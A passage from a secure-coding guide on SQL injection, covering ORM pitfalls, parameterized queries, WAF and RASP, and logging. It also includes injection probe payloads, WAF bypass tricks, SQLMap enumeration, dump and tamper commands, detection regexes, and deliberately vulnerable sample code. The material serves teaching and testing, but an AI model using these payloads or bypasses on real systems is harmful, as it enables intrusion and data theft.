# CORRECT — raw() with params
users = User.objects.raw(
    "SELECT * FROM auth_user WHERE email = %s",
    [user_input]
)

# VULNERABLE — extra() (deprecated in Django 4.x but still used in legacy code)
users = User.objects.extra(
    where=[f"email = '{user_input}'"]  # VULNERABLE
)

# CORRECT — extra() with params
users = User.objects.extra(
    where=["email = %s"],
    params=[user_input]
)

# VULNERABLE — cursor.execute() without parameters
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute(f"SELECT * FROM auth_user WHERE email = '{user_input}'")  # VULNERABLE

# CORRECT — cursor.execute() with params
with connection.cursor() as cursor:
    cursor.execute("SELECT * FROM auth_user WHERE email = %s", [user_input])

# Django does NOT protect against ORDER BY injection
# VULNERABLE
sort = request.GET.get('sort', 'name')
users = User.objects.order_by(sort)  # attacker can use '-id', 'password', etc.

# CORRECT — allowlist
ALLOWED_SORTS = {'name', 'email', '-name', '-email'}
sort = request.GET.get('sort', 'name')
if sort not in ALLOWED_SORTS:
    sort = 'name'
users = User.objects.order_by(sort)
```

---

### 6.7 Hibernate (Java)

**Safe patterns:**
```java
// SAFE — JPQL with named parameters
String jpql = "SELECT u FROM User u WHERE u.email = :email";
TypedQuery<User> query = entityManager.createQuery(jpql, User.class);
query.setParameter("email", userInput);
List<User> users = query.getResultList();

// SAFE — Criteria API
CriteriaBuilder cb = entityManager.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("email"), userInput));
```

**Injection vectors:**

```java
// VULNERABLE — JPQL string concatenation
String jpql = "SELECT u FROM User u WHERE u.email = '" + userInput + "'";
// JPQL injection has different syntax from SQL injection but is still dangerous

// VULNERABLE — Native query with concatenation
String sql = "SELECT * FROM users WHERE email = '" + userInput + "'";
Query query = entityManager.createNativeQuery(sql, User.class);

// CORRECT — Native query with parameters
Query query = entityManager.createNativeQuery(
    "SELECT * FROM users WHERE email = ?1",
    User.class
);
query.setParameter(1, userInput);

// VULNERABLE — HQL (Hibernate Query Language) with concatenation
String hql = "FROM User WHERE email = '" + userInput + "'";
Query query = session.createQuery(hql);

// CORRECT — Named parameters in HQL
Query<User> query = session.createQuery("FROM User WHERE email = :email", User.class);
query.setParameter("email", userInput);
```

---

### 6.8 Entity Framework (C#)

**Safe patterns:**
```csharp
// SAFE — LINQ queries are parameterized automatically
var user = await context.Users
    .Where(u => u.Email == userInput)
    .FirstOrDefaultAsync();

// SAFE — FromSqlRaw with parameters
var users = await context.Users
    .FromSqlRaw("SELECT * FROM Users WHERE Email = {0}", userInput)
    .ToListAsync();

// SAFE — FromSqlInterpolated (EF Core 3.0+)
var users = await context.Users
    .FromSqlInterpolated($"SELECT * FROM Users WHERE Email = {userInput}")
    .ToListAsync();
```

**Injection vectors:**

```csharp
// VULNERABLE — FromSqlRaw with string interpolation (NOT FromSqlInterpolated)
var users = await context.Users
    .FromSqlRaw($"SELECT * FROM Users WHERE Email = '{userInput}'")  // VULNERABLE
    .ToListAsync();

// The key distinction:
// FromSqlRaw("{0}", value)         → SAFE (parameterized via {0})
// FromSqlRaw($"... '{value}'")     → VULNERABLE (string interpolation, not parameterized)
// FromSqlInterpolated($"... {value}") → SAFE (EF converts to parameters)

// VULNERABLE — ExecuteSqlRaw with string interpolation
await context.Database.ExecuteSqlRaw(
    $"DELETE FROM Users WHERE Email = '{userInput}'"  // VULNERABLE
);

// CORRECT — ExecuteSqlRaw with parameters
await context.Database.ExecuteSqlRaw(
    "DELETE FROM Users WHERE Email = {0}",
    userInput
);

// OR use ExecuteSqlInterpolated
await context.Database.ExecuteSqlInterpolated(
    $"DELETE FROM Users WHERE Email = {userInput}"
);
```

**Dynamic ORDER BY (C# / EF):**
```csharp
// VULNERABLE
var sort = HttpContext.Request.Query["sort"].ToString();
var users = await context.Users
    .FromSqlRaw($"SELECT * FROM Users ORDER BY {sort}")  // VULNERABLE
    .ToListAsync();

// CORRECT — use LINQ with allowlist
var sortMap = new Dictionary<string, Expression<Func<User, object>>>
{
    ["name"] = u => u.Name,
    ["email"] = u => u.Email,
    ["created"] = u => u.CreatedAt
};

var sort = HttpContext.Request.Query["sort"].ToString();
if (!sortMap.TryGetValue(sort, out var sortExpr))
    sortExpr = u => u.CreatedAt;  // default

var users = await context.Users.OrderBy(sortExpr).ToListAsync();
```

---

### 6.9 ActiveRecord (Ruby / Rails)

**Safe patterns:**
```ruby
# SAFE — ActiveRecord parameterizes by default
user = User.where(email: params[:email]).first
users = User.where("email = ?", params[:email])
users = User.where(email: params[:email], active: true)
```

**Injection vectors:**

```ruby
# VULNERABLE — string interpolation in where()
User.where("email = '#{params[:email]}'")  # VULNERABLE

# VULNERABLE — order() with string input
User.order(params[:sort])  # VULNERABLE — attacker can ORDER BY (SELECT * FROM users LIMIT 1)

# VULNERABLE — group() with user input
User.group(params[:column])  # VULNERABLE

# VULNERABLE — select() with user input
User.select(params[:fields])  # VULNERABLE

# VULNERABLE — find_by_sql
User.find_by_sql("SELECT * FROM users WHERE email = '#{params[:email]}'")  # VULNERABLE

# CORRECT patterns
# where() with ? placeholder
User.where("email = ?", params[:email])

# where() with named placeholders
User.where("email = :email AND status = :status", email: params[:email], status: 'active')

# order() with allowlist
ALLOWED_SORTS = %w[name email created_at]
sort = ALLOWED_SORTS.include?(params[:sort]) ? params[:sort] : 'created_at'
User.order(sort)

# find_by_sql with placeholders
User.find_by_sql(["SELECT * FROM users WHERE email = ?", params[:email]])
```

---

## 7. Defense Mechanisms

### 7.1 Parameterized Queries

Parameterized queries (also called prepared statements or bind parameters) are the primary and most effective defense against SQL injection.

**The mechanism:** Instead of building a SQL string and sending it to the database, the application sends:
1. A SQL template with placeholders (`?` or `$1`, `$2`, etc.)
2. The parameter values separately

The database engine receives two distinct things: the SQL structure (trusted) and the parameter values (untrusted). Values are never interpreted as SQL syntax — they are always treated as literal data.

**Why this works:**
```
Template:  SELECT * FROM users WHERE email = $1
Value:     admin'--

Database sees:
  SQL:    SELECT * FROM users WHERE email = $1
  Param:  "admin'--"
  
The quote and double-dash are NOT parsed as SQL. They are the literal characters
in the email string. The query finds a user whose email IS the string "admin'--",
not a user named admin with the rest commented out.
```

**Language implementations:**

```javascript
// Node.js — pg (PostgreSQL)
const { rows } = await client.query(
  'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
  [email, passwordHash]
)

// Node.js — mysql2
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE email = ? AND password_hash = ?',
  [email, passwordHash]
)

// Node.js — better-sqlite3
const stmt = db.prepare('SELECT * FROM users WHERE email = ?')
const user = stmt.get(email)
```

```python
# Python — psycopg2
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

# Python — sqlite3
cursor.execute("SELECT * FROM users WHERE email = ?", (email,))

# Python — mysql-connector
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

```java
// Java — JDBC
PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM users WHERE email = ? AND password_hash = ?"
);
stmt.setString(1, email);
stmt.setString(2, passwordHash);
ResultSet rs = stmt.executeQuery();
```

```csharp
// C# — System.Data.SqlClient
using var cmd = new SqlCommand(
    "SELECT * FROM users WHERE email = @email AND password_hash = @hash",
    connection
);
cmd.Parameters.AddWithValue("@email", email);
cmd.Parameters.AddWithValue("@hash", passwordHash);
```

```php
// PHP — PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
$user = $stmt->fetch();
```

```go
// Go — database/sql
row := db.QueryRow(
    "SELECT id, name FROM users WHERE email = $1",
    email,
)
```

**What parameterized queries cannot protect:**
1. **Table and column names** — Cannot be parameterized (use allowlisting)
2. **SQL keywords** — Cannot be parameterized (use allowlisting for dynamic ORDER BY direction)
3. **LIMIT and OFFSET** — Some drivers allow these as parameters; verify your driver
4. **Second-order injection** — Input is parameterized at write time but not at read time
5. **Stored procedures that use dynamic SQL internally** — The procedure itself must use proper parameterization

---

### 7.2 Stored Procedures

Stored procedures encapsulate SQL logic in the database and can prevent injection when used correctly — but are NOT automatically safe.

**Safe use:**
```sql
-- PostgreSQL stored procedure
CREATE OR REPLACE FUNCTION get_user_by_email(user_email TEXT)
RETURNS TABLE(id UUID, name TEXT, role TEXT)
AS $$
BEGIN
  RETURN QUERY
  SELECT u.id, u.name, u.role
  FROM users u
  WHERE u.email = user_email;    -- user_email is a parameter, not interpolated
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

```sql
-- MSSQL stored procedure
CREATE PROCEDURE GetUserByEmail
    @Email NVARCHAR(255)
AS
BEGIN
    SELECT id, name, role FROM users WHERE email = @Email  -- safe
END
```

**Calling safely from application:**
```javascript
// Node.js — calling stored procedure safely
await client.query('SELECT * FROM get_user_by_email($1)', [email])
```

**When stored procedures are NOT safe:**
```sql
-- VULNERABLE stored procedure — uses EXEC with dynamic SQL
CREATE PROCEDURE SearchUsers
    @SearchTerm NVARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM users WHERE name LIKE ''%' + @SearchTerm + '%'''
    EXEC(@sql)  -- This is vulnerable inside the stored procedure!
END
```

**Safe dynamic SQL inside stored procedures:**
```sql
-- MSSQL — sp_executesql with parameters
CREATE PROCEDURE SearchUsers
    @SearchTerm NVARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM users WHERE name LIKE @term'
    EXEC sp_executesql @sql, N'@term NVARCHAR(100)', @term = '%' + @SearchTerm + '%'
END
```

---

### 7.3 Input Validation and Allowlisting

Input validation is a **secondary defense** — not a replacement for parameterized queries. It reduces the attack surface and provides defense in depth.

**Allowlisting vs Denylisting:**

```typescript
// DENYLIST approach — never sufficient
function sanitize(input: string): string {
  return input
    .replace(/'/g, "''")      // escape single quotes
    .replace(/--/g, '')       // remove SQL comments
    .replace(/;/g, '')        // remove semicolons
}
// Attackers bypass this with: Unicode variants, hex encoding, 
// database-specific comment syntax, stacked attack vectors

// ALLOWLIST approach — effective secondary defense
function validateSortColumn(column: string): string {
  const allowed = ['name', 'email', 'created_at', 'updated_at']
  if (!allowed.includes(column)) {
    throw new ValidationError(`Sort column '${column}' is not allowed`)
  }
  return column
}

function validateEmail(email: string): string {
  const emailRegex = /^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$/
  if (!emailRegex.test(email)) {
    throw new ValidationError('Invalid email format')
  }
  return email.toLowerCase()
}

function validateUUID(id: string): string {
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i
  if (!uuidRegex.test(id)) {
    throw new ValidationError('Invalid ID format')
  }
  return id
}
```

**Type coercion as validation:**
```typescript
// If the parameter is supposed to be an integer, coerce it
const userId = parseInt(req.params.id, 10)
if (isNaN(userId) || userId <= 0) {
  throw new ValidationError('Invalid user ID')
}
// Now userId is guaranteed to be a positive integer — cannot contain SQL
```

---

### 7.4 Principle of Least Privilege

Database user accounts must have only the permissions required:

```sql
-- PostgreSQL — create a restricted application user
CREATE USER app_user WITH PASSWORD 'strong_random_password';

-- Grant only what is needed
GRANT SELECT, INSERT, UPDATE ON TABLE users TO app_user;
GRANT SELECT, INSERT ON TABLE bookings TO app_user;
GRANT SELECT ON TABLE services TO app_user;

-- NEVER grant
-- GRANT ALL PRIVILEGES TO app_user;
-- GRANT SUPERUSER TO app_user;
-- GRANT pg_read_server_files TO app_user;   -- prevents COPY FROM for file read
-- GRANT pg_write_server_files TO app_user;  -- prevents COPY TO for file write
-- GRANT pg_execute_server_program TO app_user; -- prevents COPY TO PROGRAM
```

**Why this matters even with parameterized queries:**
If a parameterized query is somehow bypassed (second-order injection, stored procedure vulnerability), the damage is limited by the database user's privileges. A user with only SELECT on specific tables cannot:
- Drop tables
- Read other databases
- Execute system commands
- Write files

---

### 7.5 Dynamic SQL — Safe Patterns

Sometimes dynamic SQL is genuinely required (dynamic table names, variable column sets, reporting queries). Safe patterns exist for all cases.

**Dynamic column names — allowlist:**
```typescript
const QUERY_COLUMNS = {
  users: {
    id: 'u.id',
    name: 'u.name',
    email: 'u.email',
    created_at: 'u.created_at'
  }
} as const

function buildSelectClause(table: 'users', columns: string[]): string {
  const tableColumns = QUERY_COLUMNS[table]
  const safeColumns = columns
    .filter(col => col in tableColumns)
    .map(col => tableColumns[col as keyof typeof tableColumns])

  if (safeColumns.length === 0) {
    throw new Error('No valid columns selected')
  }
  return safeColumns.join(', ')
}
```

**Dynamic WHERE clauses — parameter accumulation:**
```typescript
interface UserFilter {
  name?: string
  email?: string
  role?: string
  createdAfter?: Date
}

function buildUserQuery(filter: UserFilter) {
  const conditions: string[] = []
  const params: unknown[] = []
  let paramIndex = 1

  if (filter.name) {
    conditions.push(`u.name ILIKE $${paramIndex++}`)
    params.push(`%${filter.name}%`)
  }
  if (filter.email) {
    conditions.push(`u.email = $${paramIndex++}`)
    params.push(filter.email)
  }
  if (filter.role) {
    const allowedRoles = ['admin', 'client', 'staff']
    if (!allowedRoles.includes(filter.role)) throw new Error('Invalid role')
    conditions.push(`u.role = $${paramIndex++}`)
    params.push(filter.role)
  }
  if (filter.createdAfter) {
    conditions.push(`u.created_at >= $${paramIndex++}`)
    params.push(filter.createdAfter)
  }

  const whereClause = conditions.length > 0
    ? `WHERE ${conditions.join(' AND ')}`
    : ''

  return {
    sql: `SELECT u.id, u.name, u.email FROM users u ${whereClause}`,
    params
  }
}

// Usage
const { sql, params } = buildUserQuery({ name: req.query.name, role: req.query.role })
const { rows } = await client.query(sql, params)
```

---

## 8. WAF — Web Application Firewall

A WAF analyzes HTTP traffic and blocks requests matching known attack patterns. WAFs are a **secondary defense layer** — they do not replace parameterized queries. They can be bypassed, but they raise the cost of attack.

### WAF Detection and Blocking

WAFs detect SQLi through:
1. **Signature-based** — regex patterns matching SQL keywords and operators
2. **Anomaly scoring** — requests accumulate a score for suspicious patterns
3. **Behavioral** — baseline normal traffic; flag deviations
4. **ML-based** — modern WAFs use models trained on attack datasets

**Common WAF products:**
- AWS WAF (managed rules: AWSManagedRulesCommonRuleSet, SQLiRuleSet)
- Cloudflare WAF
- ModSecurity (OWASP Core Rule Set — open source, self-hosted)
- Imperva (enterprise)
- F5 Advanced WAF

### WAF Bypass Techniques (Know Your Enemy)

Understanding bypass techniques is essential for testing your own WAF configuration.

**Case variation:**
```sql
SeLeCt * FrOm UsErS wHeRe EmAiL = 'test'
```

**Whitespace substitution:**
```sql
-- Normal whitespace alternatives
SELECT%09*%09FROM%09users     -- Tab
SELECT%0a*%0aFROM%0ausers     -- Newline
SELECT/*comment*/*/*comment*/FROM/*comment*/users
```

**Comment-based obfuscation:**
```sql
SE/**/LECT * FR/**/OM users
/*!SELECT*/ * FROM users
```

**Encoding:**
```sql
-- URL encoding
%27 = '
%3D = =
%2D%2D = --

-- Double URL encoding (if app decodes twice)
%2527 = %27 = '

-- Unicode variants
＇ (U+FF07) = '   -- fullwidth apostrophe
```

**Keyword alternatives:**
```sql
-- UNION alternatives
1 OR 1=1
1 AND 1=1

-- SLEEP alternatives (MySQL)
BENCHMARK(10000000, MD5(1))  -- burns CPU instead of sleeping

-- Information extraction alternatives
SELECT /*!32302 database*/()  -- version-specific comment
```

**HTTP-level bypass:**
```
-- Split the attack across multiple requests (stateful WAFs needed to block)
-- Parameter pollution: ?id=1&id=2 OR 1=1

-- HTTP parameter override
POST /users?id=1
Body: id=2 OR 1=1
-- Some WAFs only check one source
```

### WAF Tuning for SQLi

```yaml
# ModSecurity / OWASP CRS configuration
SecRuleEngine On
SecAuditEngine RelevantOnly

# Enable SQLi rules
Include modsecurity.d/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf

# Set paranoia level (1=low false positives, 4=maximum detection)
SecAction "id:900000, phase:1, nolog, pass, t:none, setvar:tx.paranoia_level=2"

# Anomaly threshold (score to block — lower = more aggressive)
SecAction "id:900110, phase:1, nolog, pass, t:none, setvar:tx.inbound_anomaly_score_threshold=5"
```

**WAF limitations:**
- Cannot protect against second-order SQLi (attack is in stored data, not HTTP request)
- Cannot protect against logic errors in application code
- False positives can block legitimate users
- Attackers with time can enumerate WAF rules

---

## 9. RASP — Runtime Application Self-Protection

RASP instruments the application itself rather than sitting as a proxy. It intercepts SQL queries at runtime and evaluates whether they contain injection patterns.

**How RASP differs from WAF:**

| | WAF | RASP |
|---|---|---|
| Location | Network proxy | Inside the application runtime |
| Context | HTTP request | Full execution context (call stack, query structure) |
| False positives | Higher (no app context) | Lower (has full context) |
| Deployment | Network appliance or CDN | Library/agent in the application |
| Protection against | Payload-based attacks | SQL structure modification at runtime |

**RASP approach — query structure validation:**

RASP can parse the query template before execution and compare it to the query structure at runtime. If they differ (injection occurred), the query is blocked.

```javascript
// Conceptual RASP implementation
function rapsSafeQuery(template: string, params: unknown[]) {
  const expectedStructure = parseSQL(template)
  // ... execute with params
  const actualQuery = buildQuery(template, params)
  const actualStructure = parseSQL(actualQuery)
  
  if (!structuresMatch(expectedStructure, actualStructure)) {
    throw new SecurityError('SQL injection detected: query structure altered')
  }
  
  return db.execute(actualQuery)
}
```

**Commercial RASP solutions:**
- Sqreen (acquired by Datadog) — now part of Datadog ASM
- Contrast Security
- OpenRASP (Baidu, open source)
- Signal Sciences / Fastly

**RASP limitations:**
- Performance overhead (~5-15ms per request)
- Language-specific agents required
- Can miss obfuscated attacks
- Adds operational complexity

---

## 10. Logging and Monitoring

### What to Log

**Log at the application layer:**
```typescript
// Log authentication events
logger.info({
  event: 'auth.login_attempt',
  request_id: req.id,
  user_id: user?.id,       // null if not found
  ip: req.ip,
  success: !!user,
  // DO NOT log: password, token, full query
})

// Log suspicious input patterns
logger.warn({
  event: 'security.suspicious_input',
  request_id: req.id,
  ip: req.ip,
  endpoint: req.path,
  reason: 'SQL keyword detected in input',
  // DO NOT log the full input if it contains PII
})

// Log query errors (not query text — may contain sensitive data)
logger.error({
  event: 'db.query_error',
  request_id: req.id,
  error_code: err.code,
  operation: 'find_user_by_email',
  // DO NOT log: the actual query, the email parameter
})
```

**Database-level logging (PostgreSQL):**
```sql
-- Enable query logging for slow/suspicious queries
-- postgresql.conf
log_min_duration_statement = 1000   -- log queries taking > 1 second
log_statement = 'ddl'               -- log DDL statements (DROP, ALTER)
log_connections = on
log_disconnections = on
log_error_verbosity = default       -- not 'verbose' — verbose leaks too much

-- For security audit (be careful — this logs ALL queries including sensitive data)
-- log_statement = 'all'  -- only enable temporarily for debugging
```

**Alerts to configure:**

```
ALERT: spike in query errors → could indicate SQLi probing
ALERT: authentication failures > threshold → brute force or SQLi-based auth bypass
ALERT: unusual query patterns → SELECT from information_schema from application user
ALERT: DDL operations from application user → application user should never do DDL
ALERT: very long queries → could indicate UNION-based injection
ALERT: queries with SLEEP, WAITFOR, BENCHMARK → time-based SQLi probing
```

### Detection Signatures

```python
# Python — detecting SQLi attempts in application logs
import re

SQLI_PATTERNS = [
    r"'[\s]*OR[\s]*['1]",           # ' OR '1'='1
    r"--[\s]*$",                      # SQL comment at end
    r";\s*DROP\s+TABLE",             # DROP TABLE
    r"UNION[\s]+SELECT",             # UNION SELECT
    r"SLEEP\s*\(",                   # SLEEP(
    r"BENCHMARK\s*\(",               # BENCHMARK(
    r"WAITFOR[\s]+DELAY",            # WAITFOR DELAY
    r"INFORMATION_SCHEMA",           # schema enumeration
    r"LOAD_FILE\s*\(",               # file read
    r"INTO\s+OUTFILE",               # file write
    r"xp_cmdshell",                  # MSSQL RCE
    r"EXEC\s*\(",                    # dynamic SQL execution
    r"pg_sleep\s*\(",                # PostgreSQL sleep
]

def contains_sqli_pattern(input_value: str) -> bool:
    for pattern in SQLI_PATTERNS:
        if re.search(pattern, input_value, re.IGNORECASE):
            return True
    return False
```

---

## 11. Detection and Penetration Testing

### 11.1 Manual Testing

**Step 1: Identify injection points**

Every parameter in every request is a potential injection point:
- GET parameters: `/search?q=test`
- POST parameters: form fields, JSON body
- Cookies: session tokens, preferences
- HTTP headers: User-Agent, Referer, X-Forwarded-For
- Path parameters: `/users/123`

**Step 2: Probe for errors**

```
Input single quote:         '
Input double quote:         "
Input backslash:            \
Input comment sequence:     --
Input comment sequence:     #
Input semicolon:            ;
Input SLEEP:                '; SLEEP(5)--
```

**Responses to look for:**
- 500 Internal Server Error (usually means injection hit a syntax error)
- Odd SQL error message exposed in response
- Blank page where content is usually shown
- Change in response time (time-based)

**Step 3: Confirm the vulnerability**

```sql
-- Confirm with a tautology
' OR '1'='1     -- should return all rows or log you in
' OR 1=1--      -- alternative

-- Confirm with a contradiction
' AND '1'='2    -- should return no rows
' AND 1=2--     -- alternative

-- Confirm with timing
'; SLEEP(5)--   -- wait exactly 5 seconds for confirmation
```

**Step 4: Map the database**

Once injection is confirmed, extract:
1. Database type and version
2. Current user and privileges
3. Database names
4. Table names in current database
5. Column names in target tables
6. Data

---

### 11.2 Automated Tools

| Tool | Type | Language | Use Case |
|---|---|---|---|
| SQLMap | Automated exploitation | Python | Full automation: detect, enumerate, extract |
| Burp Suite Scanner | Scanner | Java | Integrated with proxy; good for session-based testing |
| OWASP ZAP | Scanner | Java | Open source Burp alternative |
| Ghauri | Automated | Python | Modern SQLMap alternative; better WAF evasion |
| NoSQLMap | Automated | Python | NoSQL injection (MongoDB, etc.) |
| jSQL Injection | GUI tool | Java | Visual interface for SQLi |

---

### 11.3 SQLMap — Comprehensive Guide

SQLMap is the industry standard for automated SQL injection detection and exploitation.

**Installation:**
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python3 sqlmap-dev/sqlmap.py --version
```

**Basic usage:**
```bash
# Test a GET parameter
python3 sqlmap.py -u "https://target.com/users?id=1"

# Test a specific parameter
python3 sqlmap.py -u "https://target.com/users?id=1&name=test" -p id

# Test POST parameter
python3 sqlmap.py -u "https://target.com/login" \
  --data "email=test@test.com&password=test" \
  -p email

# Test with cookies (for authenticated testing)
python3 sqlmap.py -u "https://target.com/profile" \
  --cookie "session=abc123; csrftoken=xyz"
```

**Database enumeration:**
```bash
# Get current database
python3 sqlmap.py -u "https://target.com/users?id=1" --current-db

# List all databases
python3 sqlmap.py -u "https://target.com/users?id=1" --dbs

# List tables in a database
python3 sqlmap.py -u "https://target.com/users?id=1" -D target_db --tables

# List columns in a table
python3 sqlmap.py -u "https://target.com/users?id=1" -D target_db -T users --columns

# Dump a table
python3 sqlmap.py -u "https://target.com/users?id=1" -D target_db -T users --dump
```

**WAF evasion:**
```bash
# Use tamper scripts to evade WAF
python3 sqlmap.py -u "https://target.com/users?id=1" \
  --tamper=randomcase,space2comment,between

# Available tamper scripts
python3 sqlmap.py --list-tampers

# Common WAF-bypass tampers:
# randomcase       → SeLeCt
# space2comment    → SELECT/**/FROM
# between          → 1 BETWEEN 0 AND 1 (instead of 1>0)
# greatest         → GREATEST(1,0) (instead of 1>0)
# ifnull2ifisnull  → IFNULL(NULL,NULL) → IF(ISNULL(NULL),NULL,NULL)
# base64encode     → base64 encodes payloads
# charunicodeencode → Unicode escape encoding
```

**Blind injection optimization:**
```bash
# Adjust threads for faster extraction
python3 sqlmap.py -u "https://target.com/users?id=1" \
  --threads 5 \
  --technique=B \     # Boolean only
  --level 3 \         # More tests per parameter
  --risk 2            # Slightly more aggressive tests

# Specify database type (faster — skips detection)
python3 sqlmap.py -u "https://target.com/users?id=1" \
  --dbms=PostgreSQL
```

**Scope limitation (ethical testing):**
```bash
# Limit to specific techniques
python3 sqlmap.py -u "https://target.com/users?id=1" \
  --technique=BEUST  # Boolean, Error, Union, Stacked, Time

# Limit output to specific table (avoid dumping everything)
python3 sqlmap.py -u "https://target.com/users?id=1" \
  -D target_db -T users \
  -C id,email \      # Only these columns
  --dump \
  --stop 5            # Stop after 5 rows
```

**HTTP request file (for complex requests):**
```bash
# Save a Burp Suite request to a file, then test it
python3 sqlmap.py -r request.txt

# request.txt:
# POST /login HTTP/1.1
# Host: target.com
# Content-Type: application/json
# Cookie: session=abc123
#
# {"email":"test@test.com","password":"test"}
```

---

## 12. Vulnerable Code Examples

These examples demonstrate common vulnerabilities. Study them to recognize the pattern in code reviews.

### Example 1: Classic Login Bypass

```php
// PHP — classic login bypass
$email = $_POST['email'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    // LOGGED IN — but an attacker can set email = admin@site.com'--
    // Query becomes: SELECT * FROM users WHERE email = 'admin@site.com'--' AND password = '...'
    // Password check is commented out
}
```

### Example 2: Node.js String Concatenation

```javascript
// Node.js — search endpoint
app.get('/api/users', async (req, res) => {
  const search = req.query.search
  const db = getDb()
  
  // VULNERABLE
  const users = await db.all(
    `SELECT id, name, email FROM users WHERE name LIKE '%${search}%'`
  )
  
  res.json(users)
})
// Attack: ?search='; DROP TABLE users;--
// Attack: ?search=% UNION SELECT id, password, email FROM users--
```

### Example 3: Python — Dynamic Reporting Query

```python
# VULNERABLE — dynamic column name from user input
def get_report(column_name, start_date, end_date):
    query = f"""
        SELECT {column_name}, COUNT(*) as count
        FROM bookings
        WHERE created_at BETWEEN '{start_date}' AND '{end_date}'
        GROUP BY {column_name}
    """
    return db.execute(query)

# Attack: column_name = "1 FROM bookings; SELECT password FROM users--"
```

### Example 4: Second-Order — Profile Update

```python
# Registration (safe)
def register(username, password):
    db.execute(
        "INSERT INTO users (username, password) VALUES (%s, %s)",
        (username, hash_password(password))
    )

# Password change (VULNERABLE — uses stored username unsafely)
def change_password(user_id, new_password):
    # Retrieve username from DB
    user = db.fetchone("SELECT username FROM users WHERE id = %s", (user_id,))
    username = user['username']  # This could be: admin'--
    
    # Build unsafe query with retrieved value
    query = f"UPDATE users SET password = '{hash_password(new_password)}' WHERE username = '{username}'"
    db.execute(query)
    # If username = "admin'--", this updates admin's password
```

### Example 5: ORDER BY Injection

```javascript
// VULNERABLE — dynamic ORDER BY
app.get('/api/bookings', async (req, res) => {
  const { sort, dir } = req.query
  const query = `SELECT * FROM bookings ORDER BY ${sort} ${dir}`
  // Attack: sort=1; DROP TABLE bookings--&dir=
  // Attack: sort=(SELECT SLEEP(5))--&dir=
})
```

---

## 13. Secure Code Examples

### Example 1: Secure Login — Node.js / PostgreSQL

```typescript
import { Pool } from 'pg'
import bcrypt from 'bcrypt'

interface LoginResult {
  success: boolean
  user?: { id: string; name: string; role: string }
}

async function authenticateUser(
  pool: Pool,
  email: string,
  password: string
): Promise<LoginResult> {
  // Input validation (secondary defense)
  if (!email || typeof email !== 'string' || email.length > 320) {
    return { success: false }
  }

  // Parameterized query (primary defense)
  const { rows } = await pool.query<{
    id: string
    name: string
    role: string
    password_hash: string
  }>(
    'SELECT id, name, role, password_hash FROM users WHERE email = $1 AND active = TRUE',
    [email.toLowerCase().trim()]
  )

  if (rows.length === 0) {
    // Constant-time comparison to prevent timing attacks that reveal valid emails
    await bcrypt.compare(password, '$2b$12$invalidhashtopreventtimingattack')
    return { success: false }
  }

  const user = rows[0]
  const passwordValid = await bcrypt.compare(password, user.password_hash)

  if (!passwordValid) {
    return { success: false }
  }

  return {
    success: true,
    user: { id: user.id, name: user.name, role: user.role }
  }
}
```

### Example 2: Secure Dynamic Search — TypeScript

```typescript
interface SearchFilter {
  name?: string
  email?: string
  role?: 'admin' | 'client' | 'staff'
  sortBy?: string
  sortDir?: 'asc' | 'desc'
  page?: number
  pageSize?: number
}

const ALLOWED_SORT_COLUMNS = new Set(['name', 'email', 'created_at', 'role'])
const DEFAULT_PAGE_SIZE = 20
const MAX_PAGE_SIZE = 100

async function searchUsers(pool: Pool, filter: SearchFilter) {
  const conditions: string[] = ['active = TRUE']
  const params: unknown[] = []
  let p = 1

  if (filter.name) {
    conditions.push(`name ILIKE $${p++}`)
    params.push(`%${filter.name.slice(0, 100)}%`)  // limit length
  }

  if (filter.email) {
    conditions.push(`email ILIKE $${p++}`)
    params.push(`%${filter.email.slice(0, 320)}%`)
  }

  if (filter.role) {
    // Type system enforces this is 'admin' | 'client' | 'staff'
    conditions.push(`role = $${p++}`)
    params.push(filter.role)
  }

  // Validate sort column via allowlist
  const sortCol = filter.sortBy && ALLOWED_SORT_COLUMNS.has(filter.sortBy)
    ? filter.sortBy
    : 'created_at'

  // Validate sort direction (only two possible values)
  const sortDir = filter.sortDir === 'desc' ? 'DESC' : 'ASC'

  // Validate pagination
  const pageSize = Math.min(filter.pageSize ?? DEFAULT_PAGE_SIZE, MAX_PAGE_SIZE)
  const page = Math.max(filter.page ?? 1, 1)
  const offset = (page - 1) * pageSize

  const whereClause = `WHERE ${conditions.join(' AND ')}`

  // Column name is from allowlist (safe), values are parameterized
  const sql = `
    SELECT id, name, email, role, created_at
    FROM users
    ${whereClause}
    ORDER BY ${sortCol} ${sortDir}
    LIMIT $${p++} OFFSET $${p++}
  `
  params.push(pageSize, offset)

  const { rows } = await pool.query(sql, params)
  return rows
}
```

### Example 3: Secure Booking System — Full Pattern

```typescript
// Supabase / PostgreSQL with RLS
async function createBooking(
  sb: SupabaseClient,
  userId: string,
  serviceId: string,
  date: string,
  timeSlot: string
): Promise<{ bookingId: string }> {
  // Validate all inputs before any DB interaction
  if (!isValidUUID(serviceId)) throw new ValidationError('Invalid service ID')
  if (!isValidDate(date)) throw new ValidationError('Invalid date format')
  if (!isValidTimeSlot(timeSlot)) throw new ValidationError('Invalid time slot')

  // All values go as parameters — Supabase SDK parameterizes automatically
  const { data, error } = await sb
    .from('bookings')
    .insert({
      user_id: userId,        // from authenticated session (not user input)
      service_id: serviceId,  // validated UUID
      date: date,             // validated date string
      time_slot: timeSlot,    // validated time slot
